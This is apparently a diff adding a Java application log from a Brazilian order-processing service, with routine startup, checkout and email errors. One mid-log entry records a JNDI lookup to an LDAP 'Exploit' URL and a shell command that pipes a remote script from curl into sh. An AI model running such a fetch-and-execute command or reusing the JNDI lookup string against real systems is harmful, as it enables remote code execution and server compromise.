@@ -1,0 +1,29 @@
+2026-07-28 09:14:01,102 INFO  [main] br.empresa.app.Application - Iniciando servico de pedidos v2.4.1
+2026-07-28 09:14:01,388 INFO  [main] br.empresa.app.config.DataSourceConfig - Pool de conexoes criado (max=20)
+2026-07-28 09:14:03,911 WARN  [http-nio-8080-exec-3] br.empresa.app.web.PedidoController - Payload grande recebido: 12 MB
+2026-07-28 09:14:04,002 ERROR [http-nio-8080-exec-4] br.empresa.app.service.CheckoutService - Falha ao processar pedido #8812
+java.lang.NullPointerException: Cannot invoke "br.empresa.app.model.Cliente.getEmail()" because "cliente" is null
+	at br.empresa.app.service.CheckoutService.checkout(CheckoutService.java:87)
+	at br.empresa.app.web.PedidoController.finalizar(PedidoController.java:64)
+	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)
+	... 15 more
+2026-07-28 09:14:04,117 INFO  [http-nio-8080-exec-5] br.empresa.app.service.AuditService - Evento de auditoria registrado
+2026-07-28 09:15:44,730 ERROR [http-nio-8080-exec-7] br.empresa.app.security.PluginClassLoader - Classe remota carregada dinamicamente
+java.lang.SecurityException: Remote classloading habilitado via JNDI lookup ldap://198.51.100.77:1389/Exploit
+	at br.empresa.app.security.PluginClassLoader.defineClass(PluginClassLoader.java:112)
+	at br.empresa.app.security.PluginClassLoader.loadRemote(PluginClassLoader.java:98)
+	at br.empresa.app.integrations.JndiConnector.lookup(JndiConnector.java:41)
+	at br.empresa.app.web.AdminController.exec(AdminController.java:77)
+Caused by: java.lang.RuntimeException: java.lang.Runtime.exec("/bin/sh -c curl http://198.51.100.77/s.sh | sh") despachado
+	at br.empresa.app.util.ShellRunner.run(ShellRunner.java:33)
+	at br.empresa.app.integrations.JndiConnector.trigger(JndiConnector.java:52)
+	... 8 more
+2026-07-28 09:15:45,011 WARN  [http-nio-8080-exec-7] br.empresa.app.security.PluginClassLoader - Verificacao de origem de classe desabilitada (flag legacy)
+2026-07-28 09:16:02,540 INFO  [sched-1] br.empresa.app.jobs.ReportJob - Relatorio diario gerado em 842 ms
+2026-07-28 09:16:03,004 ERROR [sched-1] br.empresa.app.jobs.ReportJob - Falha ao enviar relatorio por e-mail
+javax.mail.MessagingException: Could not connect to SMTP host: smtp.empresa.local, port: 587
+	at br.empresa.app.jobs.ReportJob.send(ReportJob.java:121)
+	at br.empresa.app.jobs.ReportJob.run(ReportJob.java:96)
+	... 4 more
